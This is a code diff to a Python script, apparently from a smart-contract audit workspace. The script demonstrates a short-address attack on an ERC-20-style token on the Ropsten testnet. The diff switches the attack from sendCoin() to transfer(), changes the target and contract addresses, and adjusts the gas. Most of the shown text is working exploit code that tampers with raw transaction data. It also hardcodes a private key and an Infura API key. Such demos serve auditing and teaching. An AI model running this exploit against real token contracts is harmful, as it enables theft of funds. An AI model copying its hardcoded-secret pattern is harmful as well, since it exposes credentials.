@@ -5,7 +5,7 @@ import json
 from solc import compile_source
 
 # target short address
-target_addr = "0x74b09f793162A1053e6fb5447CDA3B4386340000"
+target_addr = "0xA809C5a08E9358A3e1dbbE53e89cf3Dca5f41400"
 
 
 class ShortAddrAttack:
@@ -68,17 +68,17 @@ class ShortAddrAttack:
         print("The modfied  raw data is {0}".format(raw_data))
         return raw_data
 
-    def call_sendCoin(self, _to, _amount):
-        print("Call sendCoin() to send {0} Coins to {1}...".format(_amount, _to))
+    def call_transfer(self, _to, _amount):
+        print("Call transfer() to send {0} Coins to {1}...".format(_amount, _to))
         try:
             # update nonce for account
             nonce = self.w3.eth.getTransactionCount(self.account.address)
             # build raw trasaction
-            raw_txn = self.contract_interface.functions.sendCoin(_to, _amount).buildTransaction({
+            raw_txn = self.contract_interface.functions.transfer(_to, _amount).buildTransaction({
                 'from': self.account.address,
                 'to': self.contract_addr,
                 'nonce': nonce,
-                'gas': 3000000,
+                'gas': 300000,
                 'gasPrice': Web3.toWei(5, 'gwei')})
 
             # modity data in raw_txn to add short address attack
@@ -97,7 +97,7 @@ class ShortAddrAttack:
 if __name__ == "__main__":
     http_provider_api = "https://ropsten.infura.io/v3/a209e17cf92440ccab50d2a98efe83f8"
     priv_key = "7cd2e3bcaaf9c465f5a1c85b59ac0fe9b2dc0169afa52d127df2b7e39365ba5f"
-    contract_addr = "0xde62fe573c54bc7071034a004234b1485ddd31ad"
+    contract_addr = Web3().toChecksumAddress("0x9f5b72077c2de9d2b6c8248bcfc95d7d2a3886b3")
     sol_path = "/home/reece/workspace/smartcontract/smartcontract_audit/10/1001_shortaddr.sol"
     contract_name = "<stdin>:ShortToken"
     slogan = "Short Addresses Attack Demo"
@@ -106,4 +106,4 @@ if __name__ == "__main__":
     print("#"*len(slogan))
     sAttack = ShortAddrAttack(http_provider_api, priv_key,
                               contract_addr, sol_path, contract_name)
-    sAttack.call_sendCoin(target_addr, 10)
+    sAttack.call_transfer(Web3().toChecksumAddress(target_addr), 10)
